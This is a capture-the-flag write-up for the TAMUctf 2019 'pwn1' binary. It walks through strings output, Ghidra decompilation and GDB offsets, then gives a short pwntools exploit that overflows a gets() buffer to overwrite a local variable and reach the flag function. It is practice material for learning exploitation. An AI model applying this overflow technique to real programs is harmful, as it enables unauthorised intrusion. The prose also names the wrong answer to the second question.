'''
Tamu19 (Texas A&M University CTF)
pwn1

binary given, no source code.
'file' and 'checksec' output:
    32 bit binary
    dynamically linked
    not stripped
    no stack canary
    Non exec stack enabled
    PIE enabled

When execute the binary, we have to answer some questions, otherwise it won't allow us to move forward.
Use 'strings' to see if there is any strcmp with plaintext strings.
here we go:

    _ITM_registerTMCloneTable
    UWVS
    [^_]
    Right. Off you go.
    flag.txt
    Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What... is your name?
    Sir Lancelot of Camelot
    I don't know that! Auuuuuuuugh!
    What... is your quest?
    To seek the Holy Grail.
    What... is my secret?

We can use: 'Sir Lancelot of Camelot' and 'Sir Lancelot of Camelot' to answer the first 2 questions. The third one needs some digging.

******************************************************************

+> Main function decompiled by Ghidra:

    int main(undefined1 param_1) {
      int iVar1;
*     char local_43 [43];
*     int local_18;
      undefined4 local_14;
      undefined1 *local_10;
    
      local_10 = &param_1;
      setvbuf(stdout,(char *)0x2,0,0);
      local_14 = 2;
      local_18 = 0;
      puts(
          "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
          );
      puts("What... is your name?");
      fgets(local_43,0x2b,stdin);
      iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
      if (iVar1 != 0) {
        puts("I don\'t know that! Auuuuuuuugh!");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("What... is your quest?");
      fgets(local_43,0x2b,stdin);
      iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
      if (iVar1 != 0) {
        puts("I don\'t know that! Auuuuuuuugh!");
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("What... is my secret?");
*     gets(local_43);
*     if (local_18 == -0x215eef38) {
*       print_flag();
      }
      else {
        puts("I don\'t know that! Auuuuuuuugh!");
      }
      return 0;
} 

******************************************************************

+> gets() here is the vulnerable function due to no size check, so we overflow local_43 and overwrite local_18, this is a local bufferoverflow so mitigations like NX or PIE should be okay.

+> local_18 and local_43 are declared initially right next to each other so this should be pretty forward
+> Open up GDB, set a breakpoint right after the gets() function and examine the stack.

------------------------------------------------------------------
0x565558b2 <main+313>    cmp    dword ptr [ebp - 0x10], 0xdea110c8
------------------------------------------------------------------

+> Gives away local_18 is at ebp - 0x10 and needs to be 0xdea110c8 - the value to overwrite.
+> local_43 is visible when we disasmble the main function in gdb 'disas main'

------------------------------------------------------------------
0x00000803 <+138>:   lea    eax,[ebp-0x3b]
------------------------------------------------------------------

+> Distance between them is 0x2b: 43 bytes.
+> Fill up the buffer, overwrite the next value.

'''
# Exploit
from pwn import *

def pwn():
    leskgo = process('./pwn1')
    payload = b'A'*43 + p32(0xdea110c8)
    leskgo.sendline("Sir Lancelot of Camelot")
    leskgo.sendline("To seek the Holy Grail.")
    leskgo.sendline(payload)
    leskgo.interactive()
if __name__ == "__main__":
    pwn()

# Once the check happens successful, the print_flag() function will be called and the flag will be printed.
# flag: 
